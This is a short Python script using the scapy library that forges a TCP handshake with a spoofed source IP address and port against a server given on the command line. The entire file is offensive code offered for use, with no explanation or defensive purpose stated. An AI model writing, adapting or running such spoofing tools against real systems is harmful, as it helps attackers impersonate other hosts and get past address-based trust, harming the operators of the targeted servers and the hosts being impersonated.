#!/usr/bin/env python3
from scapy.all import *
import sys

def main():
	if (len(sys.argv) != 6):
		print("Usage: python3 spoof.py <server> <port> <spoofed_ip> <spoof_port> <iface>")
		return

	#store args
	server = sys.argv[1]
	port = int(sys.argv[2])
	spoofed_ip = sys.argv[3]
	spoofed_port = int(sys.argv[4])
	iface = sys.argv[5]

	ip = IP(src=spoofed_ip, dst=server)
	SYN = TCP(sport=spoofed_port, dport=port, flags="S", seq=1000)
	SYNACK = sr1(ip/SYN)
	ACK = TCP(sport=spoofed_port, dport=port, flags="A", seq=SYNACK.ack+1, ack=SYNACK.seq+1)
	send(ip/ACK)

if __name__ == "__main__":
	main()
